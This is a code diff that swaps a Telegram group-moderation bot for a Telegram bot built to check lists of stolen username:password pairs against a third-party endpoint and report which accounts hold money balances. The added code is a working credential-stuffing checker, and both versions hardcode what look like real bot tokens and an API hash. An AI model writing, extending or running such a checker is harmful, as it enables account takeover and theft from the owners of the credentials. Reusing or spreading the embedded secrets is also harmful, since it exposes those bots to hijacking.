@@ -1,143 +1,82 @@
-from pyrogram import Client, filters
-from pyrogram import enums
-from pyrogram.enums import ChatMembersFilter, ChatMemberStatus , ChatType
-from pyrogram.types import ChatPermissions, ChatPrivileges
-import asyncio
-API_ID = 9157919
-API_HASH = "b90c282e584222babde5f68b5b63ee3b"
-BOT_TOKEN = "6947891378:AAHORS8V22hn0K1TQTE1W01OGY9C2viB9D4"
+#—————–———Welcome————————#
+# The BoT was made by 3-Developers
+# Mostafa » python coder » tg: @E_2_7
+# Ahmed » python coder » tg: @IGFIG
+# Mostafa » php coder & api maker » tg: @P_Q_Z
 
-app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
-
-
-
-#by > @O_F_4 / @O_F_4
-
-
-welcome_enabled = True
-
-
-
-
-
-
-@app.on_chat_member_updated()
-async def welcome(client, chat_member_updated):
-    if not welcome_enabled:
-        return
+# The Code is For Personal Use Only And is Not Permitted To Be Sold in Any Way
+# Don't Forget to join ch: @Telemex
+# Bye ;)
+#——————–——Creadits———–—————#
+import telebot, requests
+#———————–—Libraries————––———#
+session = requests.Session()
+#——————–——session—————————#
+bot = telebot.TeleBot('5853271927:AAE_nfZVZwAoxQmahVpGUp-SDiYcBuHIq_k')
+#——–——–—–—BoT_Login———–————#
+@bot.message_handler(commands=['start'])
+def start(message):
+	chat_id = message.chat.id
+	bot.send_message(message.chat.id, "Welcome! Send me the file.")
+#——————————————————————#
+	@bot.message_handler(content_types=['document'])
+	def handle_document(message):
+		file_info = bot.get_file(message.document.file_id)
+		downloaded_file = bot.download_file(file_info.file_path)
+		file_content = downloaded_file.decode('utf-8')
+		lines = file_content.strip().split('\n')
+#——————————————————————#
+		msg = bot.send_message(chat_id=chat_id,text="The Checking Started, Wait...⌛")
+#——————————————————————#
+		work = 0
+		cents = 0
+		fucked = 0
+#——————————Lists—————————#
+		for line in lines:
+			line = line.strip()
+			try:
+				user, pas = line.split(':')
+				email = f"{user}:{pas}"
+				email1 = f"{user} • {pas}"	#——————————————————————#
+				url = f"https://alflim.org/mos999/sms.php?email={user}&pass={pas}"
+				
+				response = session.post(url)
+#—————————Request———————––#
+				if '"status": true' in response.text:
+					balance = response.json()['Balance']
+					dollars = float(balance)	#——————————————————————#
+					if len(balance) == 5:
+						bot.send_message(chat_id, f'{email}>Working but this cent:{dollars}')
+						cents += 1
+					else:
+						bot.send_message(chat_id, f'{email}>Have money dollars:{dollars}')
+						work += 1	#——————————————————————#
+				else:
+					fucked += 1	#——————————————————————#
+				reply_markup = create_reply_markup(email1,work,cents,fucked,len(lines))
+				bot.edit_message_text(
+	chat_id=chat_id,
+	message_id=msg.message_id,
+	text="Checking in progress...\nBot By @E_2_7 & @IGFIG & @P_Q_Z",
+	reply_markup=reply_markup)
+#——————————————————————#
+			except ValueError:print("fuck")
+#——————————————————————#
+def create_reply_markup(line, work, cents, fucked, All):
+    markup = telebot.telebot.types.InlineKeyboardMarkup()
+    email_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {line} • ⌝", callback_data='none')
+    work_button = telebot.types.InlineKeyboardButton(text=f"⌯ H-Balance: {work}", callback_data='none')
+    cents_button = telebot.types.InlineKeyboardButton(text=f"Cents: {cents} ⌯", callback_data='none')
+    dead_button = telebot.types.InlineKeyboardButton(text=f"⌞ • Fucked: {fucked}", callback_data='none')
+    all_button = telebot.types.InlineKeyboardButton(text=f"All: {All} • ⌟", callback_data='none')
     
-    if chat_member_updated.new_chat_member.status == ChatMemberStatus.BANNED:
-        kicked_by = chat_member_updated.new_chat_member.restricted_by
-        user = chat_member_updated.new_chat_member.user
-        
-        if kicked_by is not None and kicked_by.is_self:
-            messagee = f"• المستخدم {user.username} ({user.first_name}) تم طرده من الدردشة بواسطة البوت"
-        else:
-            if kicked_by is not None:
-                message = f"• المستخدم [{user.first_name}](tg://user?id={user.id}) \n• تم طرده من الدردشة بواسطة [{kicked_by.first_name}](tg://user?id={kicked_by.id})\n• ولقد طردته بسبب هذا"
-                try:
-                    await client.ban_chat_member(chat_member_updated.chat.id, kicked_by.id)
-                except Exception as e:
-                    message += f"\n\nعذرًا، لم استطع حظر الإداري بسبب: {str(e)}"
-            else:
-                message = f"• المستخدم {user.username} ({user.first_name}) تم طرده من الدردشة"
-            
-            
-        
-        await client.send_message(chat_member_updated.chat.id, message)
-
-
-
-
-@app.on_message(filters.command("رفع مشرف", "") & filters.channel)
-def promote_c_admin(client, message):
-    if message.reply_to_message and message.reply_to_message.from_user:
-        target = message.reply_to_message.from_user.id
-        user_id = str(target)
-    elif message.reply_to_message is None:
-        target = message.text.split()[2]
-        user = app.get_users(target)
-        if user:
-            user_id = str(user.id)
-        else:
-            message.reply_text("لا يمكن العثور على المستخدم")
-            return
-    else:
-        target = message.text.split()[1].strip("@")
-        user = app.get_users(target)
-        if user:
-            user_id = str(user.id)
-        else:
-            message.reply_text("لا يمكن العثور على المستخدم")
-            return
-
+    team_button = telebot.types.InlineKeyboardButton(text="Dev Team", url='https://t.me/telemex')
+    dev_button = telebot.types.InlineKeyboardButton(text="Dev", url='https://t.me/E_2_7')
     
-    ToM= ChatPrivileges(
-                    can_manage_chat=True,
-                    can_delete_messages=True,
-                    can_manage_video_chats=True,
-                    can_restrict_members=True,
-                    can_promote_members=False,
-                    can_change_info=False,
-                    can_post_messages=True,
-                    can_edit_messages=True,
-                    can_invite_users=True,
-                    can_pin_messages=False,
-                    is_anonymous=False
-                )
-    chat_id = message.chat.id
-    client.promote_chat_member(chat_id, user_id, ToM)
-    message.reply(f"تم رفع {user_id} ادمن بنجاح")
-    
-
-
-
-@app.on_message(filters.command("رفع مشرف", "") & filters.group)
-def promote_g_admin(client, message):
-    if message.reply_to_message and message.reply_to_message.from_user:
-        target = message.reply_to_message.from_user.id
-        user_id = str(target)
-    elif message.reply_to_message is None:
-        target = message.text.split()[2]
-        user = app.get_users(target)
-        if user:
-            user_id = str(user.id)
-        else:
-            message.reply_text("لا يمكن العثور على المستخدم")
-            return
-    else:
-        target = message.text.split()[1].strip("@")
-        user = app.get_users(target)
-        if user:
-            user_id = str(user.id)
-        else:
-            message.reply_text("لا يمكن العثور على المستخدم")
-            return
-
-    tom_id = message.from_user.id
-    chat_id = message.chat.id
-    ToM= ChatPrivileges(
-                    can_manage_chat=True,
-                    can_delete_messages=True,
-                    can_manage_video_chats=True,
-                    can_restrict_members=True,
-                    can_promote_members=True,
-                    can_change_info=True,
-                    can_post_messages=False,
-                    can_edit_messages=False,
-                    can_invite_users=True,
-                    can_pin_messages=True,
-                    is_anonymous=False
-                )
-    tooom = client.get_chat_members(chat_id, filter=ChatMembersFilter.ADMINISTRATORS)
-    for tom in tooom:
-    	if tom.user.id == tom_id and (tom.status == enums.ChatMemberStatus.OWNER or tom.status == enums.ChatMemberStatus.ADMINISTRATOR):
-    		client.promote_chat_member(chat_id, user_id, ToM)
-    		message.reply(f"تم رفع {user_id} ادمن بنجاح")
-    	#else:
-#    		message.reply("يجب ان تكون مشرف لإستخدام الامر")
-
-app.run() 	 
-
-	 
-
+    markup.row(email_button)
+    markup.row(work_button, cents_button)
+    markup.row(dead_button, all_button)
+    markup.add(team_button,dev_button)
+    return markup
+#—————————markup—————————#
+bot.infinity_polling()
